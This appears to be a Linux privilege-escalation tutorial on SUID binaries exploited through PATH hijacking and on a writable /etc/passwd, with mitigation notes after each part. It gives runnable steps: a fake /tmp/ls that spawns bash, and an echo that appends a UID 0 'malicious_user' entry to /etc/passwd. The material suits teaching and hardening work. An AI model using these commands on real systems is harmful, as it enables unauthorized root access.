### **Understanding and Exploiting SUID Binaries for Privilege Escalation**

---

#### **What is a SUID Binary?**
- In Linux, an SUID (Set User ID) binary allows a file to be executed with the permissions of its owner instead of the user who runs it.  
- This is particularly dangerous when a file with the SUID bit set is owned by `root`, as it can give non-root users root-level access if exploited.

---

#### **How SUID Permissions Appear**
The `s` in the permissions string indicates SUID (Set User ID). For example:
```plaintext
-rwsr-xr-x  1 root root 12345 Nov 28 10:00 vulnerable_binary
```
Here, the `s` in place of the owner's execute (`x`) bit shows that this binary runs with the file owner's permissions (`root` in this case).

---

### **Finding SUID Binaries**
To locate files with the SUID bit set, you can use the following command:
```bash
find / -perm -u=s -type f 2>/dev/null
```

#### **Breaking Down the Command:**
- `find`: Searches the file system.
- `/`: Starts the search from the root directory.
- `-perm -u=s`: Matches files with the SUID permission set.
- `-type f`: Only searches for regular files.
- `2>/dev/null`: Redirects error messages (e.g., inaccessible directories) to `/dev/null`.

---

### **Example: Exploiting a SUID Binary**
#### **Scenario:**
Suppose the SUID binary `/usr/bin/vulnerable_binary` is found, owned by root.

#### **Steps to Exploit:**
1. **Examine the Binary**  
   Use `strings` or `ltrace` to analyze the binary for potential vulnerabilities:
   ```bash
   strings /usr/bin/vulnerable_binary
   ltrace /usr/bin/vulnerable_binary
   ```
   Look for indications of unsafe function calls (e.g., `system()` or `execve()`).

2. **Check for Writable Paths**  
   If the binary calls external programs, verify if those programs are writable:
   ```bash
   echo $PATH
   ls -l /path/to/external/program
   ```

3. **Manipulate the PATH Environment Variable**  
   If the binary relies on an external command, override the `PATH` to execute your malicious code:
   ```bash
   export PATH=/tmp:$PATH
   echo '/bin/bash' > /tmp/ls
   chmod +x /tmp/ls
   /usr/bin/vulnerable_binary
   ```

4. **Exploit Unsafe `system()` Calls**  
   If the binary runs shell commands using `system()`, inject malicious commands into the input or environment variables.

5. **Run the Binary**  
   If the exploit works, you should gain a root shell:
   ```bash
   /usr/bin/vulnerable_binary
   ```

---

### **Practical Example: Exposing Root Access**
Here’s a common example of exploiting a SUID binary:
1. **Locate SUID Binaries:**
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```
   Example output:
   ```plaintext
   /usr/bin/passwd
   /usr/bin/sudo
   /usr/local/bin/vulnerable_binary
   ```

2. **Analyze `vulnerable_binary`:**
   If the binary uses `system()` to call `ls`:
   ```bash
   strings /usr/local/bin/vulnerable_binary
   ```
   Output might show:
   ```plaintext
   system("ls")
   ```

3. **Exploit the PATH:**
   Replace `ls` with your malicious binary:
   ```bash
   echo '/bin/bash' > /tmp/ls
   chmod +x /tmp/ls
   export PATH=/tmp:$PATH
   /usr/local/bin/vulnerable_binary
   ```
   This grants you a root shell.

---

### **Mitigation: Securing SUID Binaries**
1. **Avoid Setting SUID on Non-Essential Files**  
   Only necessary binaries (e.g., `passwd`) should have SUID permissions.

2. **Audit Regularly**  
   Run the `find` command periodically to locate and review SUID binaries.

3. **Use Access Control Lists (ACLs)**  
   Limit which users can execute SUID binaries.

4. **Keep Software Updated**  
   Vulnerabilities in SUID binaries often arise due to outdated software.

---

### **Additional Resources**
- [GTFOBins](https://gtfobins.github.io/)  
 
### **Exploiting a Writable `/etc/passwd` for Privilege Escalation**

---

#### **Overview:**
If a writable `/etc/passwd` file is discovered, it can be exploited to escalate privileges by adding a new user with root privileges. This vulnerability arises because `/etc/passwd` defines user accounts and their access levels.

---

### **Structure of `/etc/passwd`**
Each line in `/etc/passwd` follows this format:
```plaintext
username:password:UID:GID:comment:home_directory:shell
```

Example entry for the root user:
```plaintext
root:x:0:0:root:/root:/bin/bash
```

#### **Key Fields for Exploitation:**
- **Username**: Custom name for the new user.
- **Password**: Encrypted password (hash).
- **UID**: Use `0` to give the user root privileges.
- **GID**: Use `0` to make the user part of the root group.
- **Home Directory**: Path to the user's home directory.
- **Shell**: Set to `/bin/bash` for a shell.

---

### **Steps to Exploit**

#### 1. **Generate a Password Hash**
Create an encrypted password using the `openssl` command:
```bash
openssl passwd -1 -salt root password
```
Replace `password` with the desired password. Example output:
```plaintext
$1$root$CQskME2FvGfKuh/7KTPSn1
```

#### 2. **Craft a Malicious Entry**
Using the above password hash, construct a new `/etc/passwd` entry:
```plaintext
malicious_user:$1$root$CQskME2FvGfKuh/7KTPSn1:0:0:root:/root:/bin/bash
```

#### 3. **Edit `/etc/passwd`**
Append the malicious entry to the writable `/etc/passwd` file:
```bash
echo 'malicious_user:$1$root$CQskME2FvGfKuh/7KTPSn1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### 4. **Switch to the New User**
Log in as the new user:
```bash
su malicious_user
```
Enter the password you used in step 1. After logging in, you should have a root shell:
```bash
whoami
root
```

---

### **Mitigation and Hardening**
To prevent this type of exploit:
1. **Restrict Write Access to `/etc/passwd`:**
   Ensure only the root user has write access:
   ```bash
   chmod 644 /etc/passwd
   ```

2. **Audit File Permissions:**
   Regularly check for writable system files:
   ```bash
   find / -perm -2 -type f 2>/dev/null
   ```

3. **Limit Group Memberships:**
   Ensure only trusted users are part of groups with elevated permissions.

4. **Monitor System Changes:**
   Use file integrity monitoring tools like `AIDE` or `Tripwire` to detect unauthorized changes.



---

### **Key Takeaways**
- Writable `/etc/passwd` is a severe security risk.
- Exploiting this vulnerability allows attackers to create new root users.
- Regular system audits and strict permission management can mitigate this threat.

By exploiting this vulnerability, attackers can easily gain unauthorized root access, making it crucial to secure critical files on the system.
